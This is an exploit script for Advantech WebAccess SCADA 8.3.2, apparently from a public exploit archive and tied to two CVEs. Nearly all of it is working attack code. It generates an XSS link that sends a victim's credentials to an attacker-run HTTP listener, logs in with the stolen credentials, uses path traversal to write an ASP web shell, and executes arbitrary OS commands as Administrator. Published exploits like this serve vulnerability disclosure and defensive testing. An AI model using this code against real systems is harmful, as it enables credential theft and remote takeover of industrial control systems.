# Exploit Title: Advantech WebAccess SCADA 8.3.2 - Remote Code Execution
# Date: 2018-11-02
# Exploit Author: Chris Lyne (@lynerc)
# Vendor Homepage: http://www.advantech.com
# Device: NRVMini2
# Software Link: http://downloadt.advantech.com/download/downloadsr.aspx?File_Id=1-1MDG1BH
# Version: 8.3.2
# Tested on: Windows Server 2008 R2
# CVE: CVE-2018-15705, CVE-2018-15707
# TRA: https://www.tenable.com/security/research/tra-2018-35
# Description:
#
# This code exploits two vulnerabilities to gain remote code execution
# with Administrator privileges:
#
# 1) CVE-2018-15707 to steal credentials (XSS). User-interaction required.
# 2) CVE-2018-15705 to write an ASP file to the server.

from http.server import HTTPServer, BaseHTTPRequestHandler
from base64 import decodestring
import re
import requests, urllib, json
import sys
import argparse

TIMEOUT = 5 # sec

def err_and_exit(msg):
    print '\n\nERROR: ' + msg + '\n\n'
    sys.exit(1)

# WADashboard client
class WsClient:
    def __init__(self, ip, port, https=False):
        self.ip = ip
        self.port = port
        self.https = https

        self.endpoint = 'https' if https else 'http'
        self.endpoint += '://' + ip + ':' + str(port)
        self.endpoint += '/WADashboard'

    # see if service is up
    def grab_projects(self):
        url = self.endpoint + '/api/dashboard/v6/waConfig/getWebAccessProjectList'
        r = requests.get(url, timeout=TIMEOUT)
        if "resString" in r.text:
            json_decoded = json.loads(r.text)
            if json_decoded['resString'] is not None and len(json_decoded['resString']) > 0:
                return json_decoded['resString']
        return None

    # success if we get cookies
    def login(self, projectName, user, pw):
        # issue a login request and set the cookies
        # POST /WADashboard/login?cont=dashboardViewer
        # projectName1=myproject&username=admin&password=hello&recId=
        url = self.endpoint + '/login?cont=dashboardViewer'
        data = {
            'projectName1'  : projectName,
            'username'      : user,
            'password'      : pw,
            'recId'         : ''
        }
        r = requests.post(url, data, timeout=TIMEOUT)
        if len(r.cookies) > 0:
            self.cookies = r.cookies
            return True     # success
        else:
            return False    # fail

    def write_file(self, filename, contents):
        # /WADashboard/api/dashboard/v1/files/writeFile?projectSpecies=myproject!savedConfiguration&folderpath=../../../../exec.asp&msg=contents&overwrite=true

        # post the writeFile request
        # for some reason, the data is required in the query string instead of POST data
        url = self.endpoint + '/api/dashboard/v1/files/writeFile'
        data = {
            'projectSpecies'    : victim['project'] + '!savedConfiguration',
            'folderpath'        : '../../../../' + filename,    # uploads to /Broadweb/ folder
            'msg'               : contents,
            'overwrite'         : 'true'
        }

        url += '?' + urllib.urlencode(data)
        r = requests.post(url, cookies=self.cookies, timeout=TIMEOUT)
        return (r.status_code == 200)

# This class will serve as an HTTP listener
class MyWebHandler(BaseHTTPRequestHandler):
    def do_GET(self):

        data = self.path.replace('/', '') # remove leading slash
        decoded = decodestring(data)

        print "\n***LINK CLICKED!***"

	try:
	    # carve out the piece we want to match
	    i = decoded.index('logOnWebService')
	    k = decoded.index('readNodeStatus')
	    chunk = decoded[i:k]

	    # find our match
	    regex = '^logOnWebService\\("(.+)", "(.*)"\\);.*'
	    m = re.match(regex, chunk)

            if not m:
                err_and_exit("Couldn't extract credentials...")

            print "\nCredentials stolen..."
            user = m.group(1)
            pw = m.group(2)
            print "- User: " + user
            print "- Pass: " + pw

	    # login to WADashboard
	    if not client.login(victim['project'], user, pw):
		err_and_exit("Credentials didn't work...")

	    print '\nLogged into WADashboard with credentials.'

            # write malicious ASP file
            asp_payload = '<% Set t=Server.CreateObject("webdobj.webdraw"):t.RemoteWinExec Request.QueryString("p"),Request.QueryString("n"),Request.QueryString("c"):Response.Write "Done."%>'
            filename = 'exec.asp'
            if not client.write_file(filename, asp_payload):
                err_and_exit("Write file failed...")

            print "\n'" + filename + "' written to disk."

            # execute OS command
            url = broadweb_root + '/' + filename
            data = {
                'p' : victim['project'],
                'n' : victim['node'],
                'c' : victim['cmd']
            }

            url += '?' + urllib.urlencode(data)
            r = requests.get(url, timeout=TIMEOUT)   # no cookie needed
            if r.status_code == 200:
                print "\nSuccessful request to '" + url + "'\n"
            else:
                print "\nThere may be something wrong with the ASP payload.\n"

            print "\nDone!"
	except Exception as e:
            print "Exception encountered: " + str(e)

        msg = 'hello poppet'

        self.send_response(200)
        self.end_headers()
        self.wfile.write(str.encode(msg))

# MAIN

# deal with command line flags
desc = '''This exploit targets Advantech WebAccess/SCADA 8.3.2. It has been tested against Windows 2008 R2 x64.

The goal of the script is to execute code remotely. User interaction is required.

The following operations will be conducted:
1) Ensure WebAccess application is running. (TCP port 80 by default)
2) Ensure WADashboard is running. (TCP port 8081 by default)
3) Ensure user-specified project exists.
4) Ensure user-specified node exists.
5) Generate malicious link to send to victim user. (exploits CVE-2018-15707 to steal credentials via XSS)
6) Start HTTP listener to receive credentials when victim clicks the link.
7) Login to WADashboard.
8) Write a malicious ASP file to the root of the WebAccess application. (exploits CVE-2018-15705)
Note: elevated privileges will be obtained using the Webdraw RemoteWinExec function.
9) Execute user-specified command.

Example (equivalent) commands:
python script.py -t 192.168.0.2 -p1 80 -p2 8081 -https false -proj myproject -node mynode -ip 192.168.0.3 -port 9999 -cmd calc.exe
python script.py -t 192.168.0.2 -proj myproject -node mynode -ip 192.168.0.3 -cmd calc.exe
'''

arg_parser = argparse.ArgumentParser(description=desc)
arg_parser.add_argument('-t', required=True, help='Target IP (Required)')
arg_parser.add_argument('-p1', type=int, default=80, help='WebAccess Port (Default: 80)')
arg_parser.add_argument('-p2', type=int, default=8081, help='WADashboard Port (Default: 8081)')
arg_parser.add_argument('-https', type=bool, default=False, help='HTTPS (Default: false)')
arg_parser.add_argument('-proj', required=True, help='Project name')
arg_parser.add_argument('-node', required=True, help='Node name')
arg_parser.add_argument('-ip', required=True, help='HTTP listener IP')
arg_parser.add_argument('-port', type=int, default=9999, help='HTTP listener port (Default: 9999)')
arg_parser.add_argument('-cmd', required=True, help='OS command to be executed')

args = arg_parser.parse_args()

# victim settings
victim = dict()
victim['ip'] = args.t
victim['web_port'] = args.p1         # Broadweb web app port
victim['ws_port'] = args.p2        # WADashboard Node.js service port
victim['https'] = args.https
victim['project'] = args.proj
victim['node'] = args.node
victim['cmd'] = args.cmd

# listener settings
listener = dict()
listener['ip'] = args.ip
listener['port'] = args.port

# validate IP addresses
ip_pattern = "[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+"
for ip in [victim['ip'], listener['ip']]:
    match = re.match(ip_pattern, ip)
    if match is None:
	print "\nError: IP Address is invalid: '" + ip + "'.\n"
	arg_parser.print_help()
	sys.exit(1)

# start the real work
# ensure WebAccess ASP application is running
print "\nPerforming some banner checks to ensure services are running...\n"
proto = 'https' if victim['https'] else 'http'
broadweb_root = proto + '://' + victim['ip']
# no need to add port if it's 80 or 443
https = victim['https']
if (https and victim['web_port'] != 443) or (victim['web_port'] != 80 and not https):
    broadweb_root += ':' + str(victim['web_port'])
broadweb_root += '/broadWeb'
url = broadweb_root + '/bwRoot.asp'

try:
    r = requests.get(url, timeout=TIMEOUT)
except requests.exceptions.ConnectionError as e:
    err_and_exit('Cannot reach host ' + victim['ip'] + ' on port ' + str(victim['web_port']))

if 'Welcome to Advantech WebAccess' not in r.text:
    err_and_exit('WebAccess not found.')

print 'WebAccess is up.'

# ensure WADashboard Node.js service is running
# and projects are defined
client = WsClient(victim['ip'], victim['ws_port'], https=https)

try:
    projects = client.grab_projects()
except requests.exceptions.ConnectionError as e:
    err_and_exit('Cannot reach host ' + victim['ip'] + ' on port ' + str(victim['ws_port']))

if not projects:
    err_and_exit('Dashboard Viewer not found.')

print "Dashboard Viewer is up."

if len(projects) == 0:
    err_and_exit("No projects found...")

print "\nFound projects: "
for project in projects:
    print " - " + project

# ensure specified project exists
if victim['project'] not in projects:
    err_and_exit("Specified project, " + victim['project'] + " was not found...")

print "Specified project '" + victim['project'] + "' exists."

# ensure nodes are defined for project
# we have to specify a node name to run the custom RemoteWinExec() function
url = broadweb_root + '/' + victim['project']  +'.dpj'
r = requests.get(url, timeout=TIMEOUT)
node_list = list()
if "[nodelist]" in r.text:
    for line in r.text.split('\n'):
        regex = "^node[0-9]=(.*)$"
        m = re.match(regex, line, flags=re.MULTILINE)
        if m:
            node_list.append(m.group(1).strip())

if len(node_list) == 0:
    err_and_exit("No nodes found...")

print "\nFound nodes: "
for node in node_list:
    print ' - ' + node

if victim['node'] not in node_list:
    err_and_exit("Node, " + victim['node'] + " not in node list...")

print "Specified node '" + victim['node'] + "' exists."

# generate link to send to victim
print "\nSend this link to the victim:"
print "Keep in mind, they could be logged in via localhost."
link = broadweb_root + '/bwmainleft.asp?pid=1&pname=");i=document.createElement(\'img\');'
link += 'i.src="http://' + listener['ip'] + ':' + str(listener['port']) + '/'
link += '"%2bbtoa(document.getElementsByTagName(\'script\')[4].text);//'

print link

# start listener
print "\nListening on " + listener['ip'] + ":" + str(listener['port'])
print "Waiting for victim to click link..."
httpd = HTTPServer((listener['ip'], listener['port']), MyWebHandler)
httpd.handle_request()